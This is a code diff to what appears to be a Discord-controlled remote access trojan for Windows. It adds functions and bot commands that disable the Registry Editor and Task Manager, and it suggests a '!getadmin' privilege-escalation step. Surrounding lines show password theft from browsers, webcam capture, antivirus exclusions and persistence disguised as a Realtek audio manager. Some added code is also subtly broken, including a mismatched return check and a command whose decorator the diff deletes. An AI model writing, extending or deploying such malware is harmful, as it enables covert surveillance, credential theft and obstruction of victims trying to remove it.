@@ -175,6 +175,76 @@ def add_to_defender_exclusions():
         print(f"Error adding to exclusions: {str(e)}")
         return False
 
+def disable_registry_editor():
+    """Disables the Windows Registry Editor by modifying registry settings"""
+    if platform.system() != "Windows":
+        return "Not a Windows system"
+    
+    try:
+        # Check if running as admin
+        admin_status = is_admin()
+        
+        import winreg
+        success = False
+        user_error = "Not attempted"
+        machine_error = "Not attempted"
+        
+        # Try HKEY_CURRENT_USER first (might work without admin on some Windows versions)
+        try:
+            key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
+            winreg.CloseKey(key)
+            success = True
+        except Exception as e:
+            user_error = str(e)
+        
+        # If admin, also try HKEY_LOCAL_MACHINE (more effective on newer Windows)
+        if admin_status:
+            try:
+                key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+                key = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_SET_VALUE)
+                winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1)
+                winreg.CloseKey(key)
+                success = True
+            except Exception as e:
+                machine_error = str(e)
+        
+        if success:
+            return "Success"
+        else:
+            if admin_status:
+                return f"Failed despite admin rights. Errors: HKCU: {user_error}, HKLM: {machine_error}"
+            else:
+                return f"Failed without admin rights. Error: {user_error}. Try running as administrator."
+            
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+def disable_task_manager():
+    """Disables the Windows Task Manager by modifying registry settings"""
+    if platform.system() != "Windows":
+        return False
+    
+    try:
+        import winreg
+        # Path to the registry key that controls Task Manager
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
+        
+        # Open or create the key
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
+        except:
+            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
+        
+        # Set the DisableTaskMgr value to 1 (disabled)
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+        return True
+    except Exception as e:
+        print(f"Error disabling Task Manager: {str(e)}")
+        return False
+
 def create_chat_window(author_name, channel_id):
     global CHAT_ACTIVE, CHAT_WINDOW, receive_chat_message
     
@@ -1521,6 +1591,20 @@ async def take_webcam_photo(ctx):
         if os.path.exists(webcam_path):
             os.remove(webcam_path)
 
+@bot.command(name="disableregedit", aliases=["dre"])
+async def cmd_disable_registry_editor(ctx):
+    """Disables the Windows Registry Editor"""
+    result = disable_registry_editor()
+    
+    if result == "Success":
+        await ctx.send(f"✅ Registry Editor has been disabled on {SYSTEM_NAME}")
+    else:
+        await ctx.send(f"❌ Failed to disable Registry Editor on {SYSTEM_NAME}: {result}")
+        
+        # Suggest UAC bypass if not admin
+        if "without admin rights" in result:
+            await ctx.send("💡 Try using `!getadmin` command first to gain administrator privileges")
+
 @bot.command(name='grabpasswords', help='Grabs saved passwords from browsers')
 async def grab_passwords_command(ctx):
     await ctx.send("🔍 Searching for saved passwords... This may take a moment.")
@@ -1794,7 +1878,19 @@ async def play_media(ctx):
         tb = traceback.format_exc()
         await ctx.send(f"Detailed error:\n```\n{tb[:1500]}\n```")
 
-@bot.command(name='disableav', help='Creates security exceptions for the current process')
+@bot.command(name="disabletaskmanager", aliases=["dtm"])
+async def cmd_disable_task_manager(ctx):
+    """Disables the Windows Task Manager"""
+    result = disable_task_manager()
+    
+    if result == "Success":
+        await ctx.send(f"✅ Task Manager has been disabled on {SYSTEM_NAME}")
+    else:
+        await ctx.send(f"❌ Failed to disable Task Manager on {SYSTEM_NAME}: {result}")
+        
+        # Suggest UAC bypass if not admin
+        if "without admin rights" in result:
+            await ctx.send("💡 Try using `!getadmin` command first to gain administrator privileges")
 async def disable_av(ctx):
     """Creates security exceptions for the current process using low-level techniques"""
     if platform.system() != "Windows":
@@ -2885,8 +2981,6 @@ Comment=Realtek HD Audio Manager'''
 def monitor_forbidden_processes():
     """Monitor for forbidden processes like Task Manager and Registry Editor"""
     forbidden_processes = [
-        "taskmgr.exe",      # Task Manager
-        "regedit.exe",      # Registry Editor
         "procexp.exe",      # Process Explorer
         "procmon.exe",      # Process Monitor
         "processhacker.exe" # Process Hacker
